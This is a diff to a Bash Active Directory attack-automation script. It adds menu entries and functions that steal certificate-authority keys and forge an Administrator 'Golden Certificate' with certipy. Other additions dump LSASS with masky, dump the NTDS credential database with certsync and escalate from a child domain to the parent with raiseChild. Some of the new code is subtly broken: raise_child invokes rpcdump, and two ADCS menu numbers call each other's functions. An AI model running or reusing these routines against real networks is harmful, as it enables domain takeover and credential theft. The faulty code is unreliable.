@@ -861,7 +861,7 @@ deleg_enum () {
 }
 
 fqdn_to_ldap_dn() {
-  sed -e 's/[^ ]*/dc=&/g' <<<"${1//./ }" -e 's/ /,/g'
+  sed -e 's/[^ ]*/DC=&/g' <<<"${1//./ }" -e 's/ /,/g'
 }
 
 bloodyad_all_enum () {
@@ -1053,8 +1053,9 @@ sccm_enum (){
             echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
+            run_command "$(which python) ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
             run_command "$(which python) ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-            if [[ ! $(grep 'SCCM doesn' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]]; then
+            if [[ ! $(grep 'SCCM doesn' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]] && [[ ! $(grep 'Traceback' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]]; then
                 run_command "$(which python) ${sccmhunter} show -users" 2>/dev/null | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
                 run_command "$(which python) ${sccmhunter} show -computers" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
                 run_command "$(which python) ${sccmhunter} show -groups" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
@@ -1463,6 +1464,80 @@ certipy_ldapshell () {
     echo -e ""
 }
 
+certipy_ca_dump () {
+    if [[ ! -f "${certipy}" ]] ; then
+        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+    else
+        echo -e "${BLUE}[*] Certipy extract CAs and forge Golden Certificate${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certipy requires credentials${NC}"
+        else
+            ne_adcs_enum
+            domain_DN=$(fqdn_to_ldap_dn ${dc_domain})
+            current_dir=$(pwd)
+            cd ${output_dir}/Credentials
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+            i=0
+            for pki_server in $pki_servers; do
+                i=$((i + 1))
+                pki_ca=$(echo -e $pki_cas | sed 's/ /\n/g' | sed -n ${i}p)
+                run_command "${certipy} ca ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -backup" | tee -a "${output_dir}/ADCS/certipy_ca_backup_output_${dc_domain}.txt"
+                run_command "${certipy} forge -ca-pfx ${output_dir}/Credentials/${pki_ca}.pfx -upn Administrator@${dc_domain} -subject CN=Administrator,CN=Users,$domain_DN -out Administrator_${pki_ca}_${dc_domain}.pfx" | tee -a "${output_dir}/ADCS/certipy_forge_output_${dc_domain}.txt"
+                if [[ -f "${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx" ]]; then
+                    echo -e "${GREEN}[+] Golden Certificate successfully generated!${NC}"
+                    echo -e "${CYAN}Authenticate using pfx of Administrator:${NC}"
+                    echo -e "${certipy} auth -pfx ${output_dir}/Credentials/Administrator_${pki_ca}_${dc_domain}.pfx -dc-ip ${dc_ip} [-ldap-shell]"
+                fi
+            done
+            cd ${current_dir}  
+        fi
+    fi
+    echo -e ""
+}
+
+masky_dump () {
+    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
+    else
+        ne_adcs_enum
+        if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
+            if [ "${kerb_bool}" == true ]; then
+                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+                curr_targets="Domain Controllers"
+            fi
+            smb_scan
+            i=0
+            for pki_server in $pki_servers; do
+                i=$((i + 1))
+                pki_ca=$(echo -e $pki_cas | sed 's/ /\n/g' | sed -n ${i}p)
+                for i in $(/bin/cat ${servers_smb_list}); do
+                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
+                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
+                done
+            done
+        else
+            echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
+        fi
+    fi
+    echo -e ""
+}
+
+certsync_ntds_dump () {
+    if [ ! -f "${certsync}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
+    else
+        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
+        if [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
+            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
 ###### bruteforce: Brute Force attacks
 ridbrute_attack () {
     if [ "${nullsess_bool}" == true ] ; then
@@ -1728,6 +1803,18 @@ ms14-068_check () {
                 echo -e "${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
             fi
         fi
+    fi
+    echo -e ""
+}
+
+raise_child () {
+    if [ ! -f "${impacket_raiseChild}" ]; then
+        echo -e "${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}"
+    elif [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
+    else
+        echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
+        run_command "${impacket_rpcdump} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${dc_domain}.txt" 2>&1 | tee -a ${output_dir}/Kerberos/impacket_raiseChild_output.txt
     fi
     echo -e ""
 }
@@ -2229,18 +2316,6 @@ shadowcreds_attack () {
     echo -e ""
 }
 
-raise_child () {
-    if [ ! -f "${impacket_raiseChild}" ]; then
-        echo -e "${RED}[-] raiseChild.py not found! Please verify the installation of impacket ${NC}"
-    elif [ "${nullsess_bool}" == true ]; then
-        echo -e "${PURPLE}[-] raiseChild requires credentials${NC}"
-    else
-        echo -e "${BLUE}[*] Running privilege escalation from Child Domain to Parent Domain using raiseChild${NC}"
-        run_command "${impacket_rpcdump} ${argument_imp} -w ${output_dir}/Credentials/raiseChild_ccache_${dc_domain}.txt" 2>&1 | tee -a ${output_dir}/Modification/impacket_raiseChild_output.txt
-    fi
-    echo -e ""
-}
-
 pygpo_abuse () {
     if [ ! -f "${pygpoabuse}" ]; then
         echo -e "${RED}[-] Please verify the installation of pygpoabuse${NC}"
@@ -2554,49 +2629,6 @@ hekatomb_dump () {
             cd ${output_dir}/Credentials
             run_command "${hekatomb} ${argument_hekatomb}@${dc_ip} -dns ${dc_ip} -smb2 -csv" | tee ${output_dir}/Credentials/hekatomb_${dc_domain}.txt
             cd ${current_dir} 
-        fi
-    fi
-    echo -e ""
-}
-
-masky_dump () {
-    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
-    if [ "${nullsess_bool}" == true ] ; then
-        echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
-    else
-        ne_adcs_enum
-        if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
-            if [ "${kerb_bool}" == true ]; then
-                echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-                curr_targets="Domain Controllers"
-            fi
-            smb_scan
-            i=0
-            for pki_server in $pki_servers; do
-                i=$((i + 1))
-                pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
-                for i in $(/bin/cat ${servers_smb_list}); do
-                    echo -e "${CYAN}[*] LSASS dump of ${i} using masky (PKINIT)${NC}"
-                    run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M masky -o CA=${pki_server}\\${pki_ca} --log ${output_dir}/Credentials/lsass_dump_masky_${dc_domain}_${i}.txt" 2>&1
-                done
-            done
-        else
-            echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
-        fi
-    fi
-    echo -e ""
-}
-
-certsync_ntds_dump () {
-    if [ ! -f "${certsync}" ] ; then
-        echo -e "${RED}[-] Please verify the installation of certsync${NC}"
-    else
-        echo -e "${BLUE}[*] Dumping NTDS using certsync${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] certsync requires credentials${NC}"
-        else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
-            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${output_dir}/Credentials/certsync_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3001,6 +3033,9 @@ adcs_menu() {
     echo -e "3) Certipy ADCS Enumeration"
     echo -e "4) Certifried check"
     echo -e "5) Certipy LDAP shell via Schannel (using Certificate Authentication)"
+    echo -e "6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)"
+    echo -e "7) Dump LSASS using masky"
+    echo -e "8) Dump NTDS using certsync"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3030,6 +3065,18 @@ adcs_menu() {
 
         5)
         certipy_ldapshell
+        adcs_menu;;
+
+        6)
+        certipy_ca_dump
+        adcs_menu;;
+
+        7)
+        certsync_ntds_dump
+        adcs_menu;;
+
+        8)
+        masky_dump
         adcs_menu;;
 
         back)
@@ -3115,6 +3162,7 @@ kerberos_menu () {
     echo -e "11) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "12) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
     echo -e "13) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "14) Privilege escalation from Child Domain to Parent Domain using raiseChild"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3411,6 +3459,10 @@ kerberos_menu () {
         fi
         kerberos_menu;;
 
+        14)
+        raise_child
+        kerberos_menu;;
+
         back)
         main_menu;;
 
@@ -3635,16 +3687,13 @@ pwd_menu () {
     echo -e "10) Dump LSASS using handlekatz"
     echo -e "11) Dump LSASS using procdump"
     echo -e "12) Dump LSASS using nanodump"
-    echo -e "13) Dump LSASS using masky (ADCS required)"
-    echo -e "14) Dump dpapi secrets using netexec"
-    echo -e "15) Dump secrets using DonPAPI"
-    echo -e "16) Dump NTDS using certsync (ADCS required) (only on DC)"
-    echo -e "17) Dump secrets using hekatomb (only on DC)"
-    echo -e "18) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
-    echo -e "19) Dump Veeam credentials (only from Veeam server)"
-    echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
-    echo -e "21) Extract Bitlocker Keys"
-    echo -e "22) Privilege escalation from Child Domain to Parent Domain using raiseChild"
+    echo -e "13) Dump dpapi secrets using netexec"
+    echo -e "14) Dump secrets using DonPAPI"
+    echo -e "15) Dump secrets using hekatomb (only on DC)"
+    echo -e "16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
+    echo -e "17) Dump Veeam credentials (only from Veeam server)"
+    echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
+    echo -e "19) Extract Bitlocker Keys"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3709,43 +3758,31 @@ pwd_menu () {
         pwd_menu;;
 
         13)
-        masky_dump
-        pwd_menu;;
-
-        14)
         dpapi_dump
         pwd_menu;;
 
-        15)
+        14)
         donpapi_dump
         pwd_menu;;
 
-        16)
-        certsync_ntds_dump
-        pwd_menu;;
-
-        17)
+        15)
         hekatomb_dump
         pwd_menu;;
 
-        18)
+        16)
         juicycreds_dump
         pwd_menu;;
 
-        19)
+        17)
         veeam_dump
         pwd_menu;;
 
-        20)
+        18)
         msol_dump
         pwd_menu;;
 
-        21)
+        19)
         bitlocker_dump
-        pwd_menu;;
-
-        22)
-        raise_child
         pwd_menu;;
 
         back)
@@ -3981,7 +4018,7 @@ auth_menu () {
                 i=0
                 for pki_server in $pki_servers; do
                     i=$((i + 1))
-                    pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
+                    pki_ca=$(echo -e $pki_cas | sed 's/ /\n/g' | sed -n ${i}p)
                     run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
                 done
                 cd ${current_dir}
